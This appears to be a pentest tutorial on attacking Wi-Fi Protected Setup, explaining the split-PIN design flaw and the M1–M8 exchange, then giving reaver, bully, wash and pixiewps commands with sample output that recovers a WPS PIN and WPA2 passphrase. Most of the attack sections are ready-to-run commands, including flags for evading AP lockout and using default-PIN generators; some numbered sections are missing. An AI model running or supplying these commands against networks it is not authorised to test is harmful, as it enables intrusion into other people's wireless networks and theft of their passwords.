WPS Attacks — PIN Bruteforce & Pixie Dust

01 The WPS PIN Design Flaw

The 8-digit WPS PIN is validated by the AP in two independent halves, reducing the effective search space from 100 million to just 11,000 guesses.

The fatal flaw: The AP sends a NACK at M4 if half 1 is wrong — before half 2 is even attempted. This leaks which half is correct, transforming one 8-digit guess into two independent 4-digit and 3-digit guesses.

02 WPS M1–M8 Exchange

The WPS registration protocol exchanges 8 messages (M1–M8). The split-half validation happens at M4 and M6; the WPA2 passphrase is delivered in M8.

Enrollee──M1──►M1E-Nonce, PKE (enrollee public key)← Pixie Dust captures E-Nonce here
Registrar◄─M2───M2R-Nonce, PKR (registrar public key)← Pixie Dust captures R-Nonce here
Enrollee──M3──►M3E-Hash1 = HMAC(PIN half 1 + nonces)
Registrar◄─M4───M4R-Hash1 — validates half 1← NACK here = half 1 wrong
Enrollee──M5──►M5E-Hash2 = HMAC(PIN half 2 + nonces)
Registrar◄─M6───M6R-Hash2 — validates half 2← NACK here = half 2 wrong
Enrollee──M7──►M7Confirm
Registrar◄─M8───M8Encrypted WPA2 PSK delivered← AP hands you the real password!

Key flags: -d 1 adds a 1-second delay between attempts to avoid lock-out. -r 3:15 sleeps 15 seconds after every 3 attempts. -S uses small DH keys, which some APs require. -N disables NACKs if the AP behaves oddly.

05 Pixie Dust Attack

Pixie Dust is an offline attack that works in a single WPS exchange on routers with a weak pseudo-random number generator. No repeated guesses to the AP are needed.

💥
How it works: The enrollee's secret nonces (E-S1, E-S2) are supposed to be random. On vulnerable firmware (Ralink, Broadcom, Realtek), they are either zero, reused, or seeded from a predictable source. pixiewps recovers the PIN offline from a single M1–M3 capture.
Pixie Dust with reaver -K 1
# -K 1 enables Pixie Dust — captures exchange and calls pixiewps kali@kali:~$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1 [*] Waiting for beacon from AA:BB:CC:DD:EE:FF [+] Associated with AA:BB:CC:DD:EE:FF [+] Received M1 — capturing E-Nonce... [+] Received M2 — capturing R-Nonce... [Pixie-Dust] Running pixiewps offline analysis... [Pixie-Dust] WPS PIN found: 12345678 [+] WPA PSK: 'MySecretPassword123' [*] Time taken: 0h 0m 3s

08 bully & Full Flag References

bully is often more reliable than reaver against stubborn APs. Both tools support Pixie Dust.

bully — full usage
# bully basic PIN bruteforce kali@kali:~$ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 3 # -b Target BSSID # -v 3 Maximum verbosity (1-3) # Full options with rate-limit evasion kali@kali:~$ sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -T 0.5 -v 3 # -c N Channel # -d Use small Diffie-Hellman keys (also triggers Pixie Dust attempt) # -T N Timeout per attempt in seconds # -1 Start from PIN 00000000 (sequential mode) # -S Use fixed source MAC
wash full flags + reaver complete reference
# wash — full flag reference kali@kali:~$ sudo wash -i wlan0mon -C -s # -C Ignore FCS errors (use on weak signal) # -s Scan mode (continuous, don't stop) # -c N Lock to channel N # -v Verbose (shows WPS device info: model, serial) # -o f Write output to CSV file # -j JSON output (for scripting) # reaver — key flags you need to know -i wlan0mon ← monitor interface -b BSSID ← target AP -c N ← lock to channel N -vv ← verbose (show each attempt) -d N ← delay N seconds between attempts -t N ← timeout per attempt -r N:S ← after N attempts, sleep S seconds -S ← small DH keys (required by some APs) -N ← no NACKs (for APs that behave oddly) -K 1 ← enable Pixie Dust (calls pixiewps internally) -f ← fixed channel (don't hop) --no-nacks ← suppress NACK frames -p PIN ← start with specific PIN (for resume)

09 Advanced: pixiewps Standalone & Default PINs

pixiewps standalone — manual parameter extraction
# Step 1: Capture WPS exchange verbosely with reaver kali@kali:~$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -S 2>&1 | tee wps_capture.txt # Extract these values from verbose output: # PKE = Enrollee public key # PKR = Registrar public key # E-Hash1, E-Hash2, E-Nonce, R-Nonce, AuthKey # Step 2: Run pixiewps with extracted values kali@kali:~$ sudo pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce> # -e = Enrollee public key (PKE) # -r = Registrar public key (PKR) # -s = E-Hash1 # -z = E-Hash2 # -a = AuthKey # -n = Enrollee nonce (E-Nonce) [+] WPS pin found: 12345678 [*] Time taken: 0 s 123 ms # Default PIN databases — try before brute-forcing # Some vendors use MAC-based predictable PINs: kali@kali:~$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 # -p PIN → try a specific PIN first (e.g., known default or MAC-derived) # Tools for default PIN generation: WPSpin, RouterKeygen
💡
WPS Default PIN Databases: Tools like WPSpin and RouterKeygen derive predictable WPS PINs from the AP's MAC address using vendor-specific algorithms. Trying the derived PIN first (before brute-forcing) can crack some APs in a single attempt. Check the vendor in wash -v output then look up known algorithms.
